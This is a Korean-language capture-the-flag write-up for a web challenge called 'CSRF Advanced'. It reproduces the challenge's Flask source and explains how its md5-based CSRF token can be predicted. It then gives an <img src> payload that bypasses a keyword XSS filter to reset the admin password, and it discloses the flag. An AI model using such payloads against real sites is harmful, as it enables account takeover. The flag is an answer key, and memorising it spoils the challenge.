https://honey-push-30b.notion.site/CSRF-Advanced-a007fad75a804636836ddb7715c70152

# 문제파일 다운로드

![문제파일 다운로드.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/2d676007-5fec-4287-b379-8efe993f2291/%EB%AC%B8%EC%A0%9C%ED%8C%8C%EC%9D%BC_%EB%8B%A4%EC%9A%B4%EB%A1%9C%EB%93%9C.png)
CSRF Advanced의 문제 파일을 다운로드 받으면 app.py 파일을 얻을 수 있고 코드는 아래와 같다. 
```python
#!/usr/bin/python3
from flask import Flask, request, render_template, make_response, redirect, url_for
from selenium.webdriver.common.by import By
from selenium import webdriver
from hashlib import md5
import urllib
import os

app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
    FLAG = open("./flag.txt", "r").read()
except:
    FLAG = "[**FLAG**]"

users = {
    'guest': 'guest',
    'admin': FLAG
}

session_storage = {}
token_storage = {}

def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    options = webdriver.ChromeOptions()
    try:
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome("/chromedriver", options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/login")
        driver.add_cookie(cookie)
        driver.find_element(by=By.NAME, value="username").send_keys("admin")
        driver.find_element(by=By.NAME, value="password").send_keys(users["admin"])
        driver.find_element(by=By.NAME, value="submit").click()
        driver.get(url)
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True

def check_csrf(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    return read_url(url, cookie)

@app.route("/")
def index():
    session_id = request.cookies.get('sessionid', None)
    try:
        username = session_storage[session_id]
    except KeyError:
        return render_template('index.html', text='please login')

    return render_template('index.html', text=f'Hello {username}, {"flag is " + FLAG if username == "admin" else "you are not an admin"}')

@app.route("/vuln")
def vuln():
    param = request.args.get("param", "").lower()
    xss_filter = ["frame", "script", "on"]
    for _ in xss_filter:
        param = param.replace(_, "*")
    return param

@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html")
    elif request.method == "POST":
        param = request.form.get("param", "")
        if not check_csrf(param):
            return '<script>alert("wrong??");history.go(-1);</script>'

        return '<script>alert("good");history.go(-1);</script>'

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    elif request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        try:
            pw = users[username]
        except:
            return '<script>alert("user not found");history.go(-1);</script>'
        if pw == password:
            resp = make_response(redirect(url_for('index')) )
            session_id = os.urandom(8).hex()
            session_storage[session_id] = username
            token_storage[session_id] = md5((username + request.remote_addr).encode()).hexdigest()
            resp.set_cookie('sessionid', session_id)
            return resp 
        return '<script>alert("wrong password");history.go(-1);</script>'

@app.route("/change_password")
def change_password():
    session_id = request.cookies.get('sessionid', None)
    try:
        username = session_storage[session_id]
        csrf_token = token_storage[session_id]
    except KeyError:
        return render_template('index.html', text='please login')
    pw = request.args.get("pw", None)
    if pw == None:
        return render_template('change_password.html', csrf_token=csrf_token)
    else:
        if csrf_token != request.args.get("csrftoken", ""):
            return '<script>alert("wrong csrf token");history.go(-1);</script>'
        users[username] = pw
        return '<script>alert("Done");history.go(-1);</script>'

app.run(host="0.0.0.0", port=8000)
```

1. flag 페이지에서 파라미터를 보내면 check_csrf를 거쳐 vuln페이지로 param이 전달되는데 이 때 이 vuln페이지로 전달 될 때 ‘admin’이 로그인한 상태로 전달이 된다.
2. vuln 페이지에서는 xss_filter로 frame,script, on을 필터링하고 있으며 param으로 전달된 값을 그대로 반환해준다.(필터링이 되지 않은 스크립트는 실행이 가능하다.)
3. 로그인 시 session_id가 생성이 되고 이 session_id를 기준으로 username과 csrf_token을 저장한다.
4. 이 때 csrf_token은 생성과정이 username 과 접속 ip주소를 기반으로 md5해싱을 통해 만들기 때문에 추측이 가능하다.
5. session_id는 쿠키에 세팅이 되어있다.
6. session_id와 csrf_token을 기반으로 password를 변경하고 admin 으로 로그인하면 index 페이지에서 flag를 얻을 수 있다.

이 때 csrf_token을 제대로 추측할 수 있는지 실험을 해봤다. guest로 로그인 + 내 ip주소 1.248.181.15를 이용하여 csrf_token을 생성해봤다.

```python
>>> md5(('guest'+'1.248.181.15').encode()).hexdigest()
'e71139421b77aed596870f22cb3f1d82'
----------------------------------------------------------------------------------
<input type="text" value="e71139421b77aed596870f22cb3f1d82" name="csrftoken" hidden>
```

![csrf 토큰 추측이 가능함.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/0e2459cd-d20b-4048-bcef-6a2a149ac1c6/csrf_%ED%86%A0%ED%81%B0_%EC%B6%94%EC%B8%A1%EC%9D%B4_%EA%B0%80%EB%8A%A5%ED%95%A8.png)

그 결과 둘의 값이 동일하므로 제대로 추측 성공한 것을 확인할 수 있었다.

즉 flag페이지를 이용하여 접속할 때는 read_url로 인해서 admin + 127.0.0.1 이므로 csrf_token은

```python
>>> md5(('admin'+'127.0.0.1').encode()).hexdigest()
'7505b9c72ab4aa94b1a4ed7b207b67fb'
```

이 될것이다. 

이제 vuln 페이지를 이용해서<img src="127.0.0.1:8000/change_password?pw=admin&csrftoken=7505b9c72ab4aa94b1a4ed7b207b67fb">를 넣어서 비밀번호를 admin으로 바꿔준 후 admin/admin으로 로그인해주면

![로그인 플래그.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8c425979-9923-4516-bd6d-1a529c02d929/%EB%A1%9C%EA%B7%B8%EC%9D%B8_%ED%94%8C%EB%9E%98%EA%B7%B8.png)

flag 값인****`DH{77bb582329a1b2fc9f8dc2a50b70d586}`** 를 얻을 수 있다.
